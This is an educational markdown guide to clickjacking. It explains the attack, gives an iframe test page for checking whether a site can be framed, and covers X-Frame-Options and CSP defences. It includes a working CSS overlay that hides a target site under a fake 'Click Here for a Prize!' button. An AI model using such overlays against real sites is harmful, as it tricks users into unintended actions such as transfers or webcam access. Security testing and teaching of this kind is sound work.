# 🛡️ Clickjacking (Click Hijacking) – Full Guide

> ⚠️ **Funny Disclaimer**:
> This guide is for **educational purposes only**.
> If you try this on websites you don't own, expect a knock on your door — not from opportunity, but from law enforcement. 🕵️‍♂️💻🚔
> So test responsibly, or the only thing you’ll be hijacking is your own future. 😅

---

Clickjacking is a **web-based attack** where a user is tricked into clicking something **they didn’t intend to**, by overlaying or hiding malicious elements on top of legitimate ones using an `<iframe>`.

---

## 🧠 Simple Explanation

Imagine you think you're clicking a **"Play"** button, but actually you’re clicking a **“Transfer Money”** or **“Enable Webcam”** button hidden underneath — that’s clickjacking.

---

## 🎯 Goal of Clickjacking

To trick users into performing actions like:

* Liking a page
* Transferring money
* Changing account settings
* Enabling camera/mic access
* Clicking ads or confirming sensitive operations

---

## 🛠️ How It Works (Behind the Scenes)

1. Attacker embeds a **legitimate site** inside an invisible `<iframe>`.
2. Places **fake UI/buttons** above it using CSS.
3. Victim clicks on the fake UI, but their action is registered on the **hidden real site**.

---

## 🧪 Example Code (Test Page)

This basic HTML demonstrates a clickjacking vulnerability test:

```html
<html>
<head>
<title>Clickjack test page</title>
</head>
<body>
<p>Website is vulnerable to clickjacking!</p>
<iframe src="https://www.domain.com/" width="5000" height="1000"></iframe>
</body>
</html>
```

### ✅ How to Use:

1. Save the code as `clickjack.html`.
2. Replace `https://www.domain.com/` with the URL you want to test.
3. Open it in a browser.
4. If the site **loads inside the iframe**, it’s **likely vulnerable**.

---

## 🔐 Detecting Vulnerability

* **If the iframe loads** → site may be vulnerable.
* **If it doesn’t load** and shows:

  > "Refused to display in a frame because it set 'X-Frame-Options'..."

  → the site is **protected**.

---

## 🧙 Real Attack Simulation (CSS Overlay)

```html
<style>
iframe {
    position: absolute;
    top: 0;
    left: 0;
    opacity: 0.1;
    z-index: 2;
}
#fake-button {
    position: absolute;
    top: 50px;
    left: 100px;
    z-index: 3;
    background: red;
    color: white;
    padding: 10px;
    cursor: pointer;
}
</style>

<div id="fake-button">Click Here for a Prize!</div>
<iframe src="https://yourtarget.com/" width="800" height="600"></iframe>
```

This simulates a user clicking the visible red button but actually interacting with the site underneath.

---

## 🚫 How to Prevent Clickjacking (For Developers)

Use HTTP headers:

### 1. **X-Frame-Options** (Older but still useful)

```http
X-Frame-Options: DENY
```

or

```http
X-Frame-Options: SAMEORIGIN
```

### 2. **Content Security Policy** (Recommended)

```http
Content-Security-Policy: frame-ancestors 'none';
```

---

## 🛡️ How Users Can Stay Safe

* Keep browsers updated
* Use browser extensions like **NoScript**, **uBlock Origin**
* Don’t click suspicious buttons or pop-ups

---

## 🧯 Final Words

Clickjacking is clever, sneaky, and surprisingly simple — but with proper headers and cautious clicks, you can block the hijack before it happens.

---
